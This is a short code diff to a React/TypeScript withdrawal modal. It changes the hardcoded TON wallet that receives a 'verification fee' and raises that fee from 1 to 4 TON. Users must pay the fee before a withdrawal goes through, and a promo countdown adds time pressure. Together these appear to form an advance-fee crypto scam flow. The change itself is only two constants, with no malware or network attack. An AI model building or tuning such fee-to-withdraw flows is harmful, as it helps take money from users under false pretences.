@@ -20,7 +20,7 @@ interface WithdrawalRequirementsModalProps {
 
 type Step = 'verification' | 'server' | 'ticket' | 'complete';
 
-const VERIFICATION_WALLET = 'UQCFrjvfMxqHh4-tooMa22uNvbKGd73KfGab3cePjZxq_uNb';
+const VERIFICATION_WALLET = 'UQCiVNm22dMF9S3YsHPcgrmqXEQHt4MIdk_N7VJu88NrLr4R';
 
 const formatCountdown = (ms: number) => {
   const totalSeconds = Math.floor(ms / 1000);
@@ -43,8 +43,8 @@ const WithdrawalRequirementsModal: React.FC<WithdrawalRequirementsModalProps> = 
   
   // Use backend promo settings
   const { isPromoActive: promoActive, timeRemaining } = usePromoSettings();
-  // Fixed withdrawal fee - always 1 TON
-  const verificationFee = 1;
+  // Fixed withdrawal fee - always 4 TON
+  const verificationFee = 4;
   
   const [currentStep, setCurrentStep] = useState<Step>('verification');
   const [isLoading, setIsLoading] = useState(false);
